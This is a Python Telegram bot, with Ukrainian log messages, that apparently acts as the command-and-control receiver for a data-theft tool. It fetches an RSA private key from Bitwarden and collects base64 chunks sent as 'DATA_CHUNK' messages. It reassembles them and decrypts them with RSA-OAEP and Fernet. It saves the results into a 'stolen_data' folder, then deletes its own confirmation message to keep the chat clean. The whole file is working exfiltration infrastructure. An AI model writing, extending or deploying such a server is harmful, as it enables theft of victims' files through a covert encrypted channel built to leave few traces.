import telebot
import base64
import time
import os
from dotenv import load_dotenv, find_dotenv
from bitwarden_sdk import BitwardenClient, ClientSettings
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.fernet import Fernet

load_dotenv(find_dotenv())

TOKEN = os.getenv("TELEGRAM_TOKEN")
BWS_ACCESS_TOKEN = os.getenv("BWS_ACCESS_TOKEN")
SECRET_ID = os.getenv("SECRET_ID")

if not TOKEN or not BWS_ACCESS_TOKEN:
    print("[-] ПОМИЛКА: Не вдалося завантажити змінні з .env! Перевір файл.")
    exit()

bot = telebot.TeleBot(TOKEN)

def get_private_key_from_cloud():
    print("[*] Звертаюся до Bitwarden за приватним ключем...")
    try:
        client = BitwardenClient(ClientSettings(
            identity_url="https://identity.bitwarden.com",
            api_url="https://api.bitwarden.com"
        ))

        client.auth().login_access_token(BWS_ACCESS_TOKEN)
        
        secret = client.secrets().get(SECRET_ID)
        
        key_text = secret.data.value.strip()

        loaded_key = serialization.load_pem_private_key(
            key_text.encode(),
            password=None,
        )
        print("[+] УСПІХ: Приватний ключ успішно завантажено в RAM!")
        return loaded_key
        
    except Exception as e:
        print(f"[-] КРИТИЧНА ПОМИЛКА BITWARDEN: {e}")
        exit()

private_key = get_private_key_from_cloud()

chunks_storage = {}

@bot.message_handler(content_types=['text'])
def handle_chunks(message):
    if message.text.startswith("DATA_CHUNK|"):
        try:
            parts = message.text.split("|")
            if len(parts) == 5:
                _, file_id, idx, total_parts, chunk_data = parts
                idx = int(idx)
                total_parts = int(total_parts)

                if file_id not in chunks_storage:
                    chunks_storage[file_id] = {'total': total_parts, 'chunks': {}}

                chunks_storage[file_id]['chunks'][idx] = chunk_data
                print(f"[*] Отримано шматок {idx + 1} із {total_parts} (Файл: {file_id})")

                if len(chunks_storage[file_id]['chunks']) == total_parts:
                    print(f"[+] Всі шматки для {file_id} отримано! Починаю збірку...")
                    assemble_and_decrypt(file_id, message)

        except Exception as e:
            print(f"[-] Помилка при обробці шматка: {e}")

def assemble_and_decrypt(file_id, message):
    try:
        file_info = chunks_storage[file_id]
        
        full_b64_string = ""
        for i in range(file_info['total']):
            full_b64_string += file_info['chunks'][i]

        encrypted_binary = base64.b64decode(full_b64_string)

        enc_aes_key = encrypted_binary[:256]
        enc_data = encrypted_binary[256:]

        aes_key = private_key.decrypt(
            enc_aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        cipher_aes = Fernet(aes_key)
        decrypted_data = cipher_aes.decrypt(enc_data)

        os.makedirs("stolen_data", exist_ok=True)
        save_path = os.path.join("stolen_data", f"recovered_{file_id}.txt")

        with open(save_path, "wb") as f:
            f.write(decrypted_data)

        print(f"[+++] УСПІХ! Файл розшифровано і збережено як {save_path}")
        
        confirm_msg = bot.send_message(message.chat.id, "я сервер. все отримав , дякую")
        time.sleep(1) 
        
        try:
            bot.delete_message(message.chat.id, confirm_msg.message_id)
            print("[*] Повідомлення сервера видалено. Чат чистий!")
        except Exception as e:
            print(f"[-] Непередбачена помилка видалення: {e}")

        del chunks_storage[file_id]

    except Exception as e:
        print(f"[-] Справжня помилка збірки/розшифрування: {e}")

if __name__ == "__main__":
    print("[*] Сервер запущено. Чекаю на текстові фрагменти...")
    bot.polling(none_stop=True)

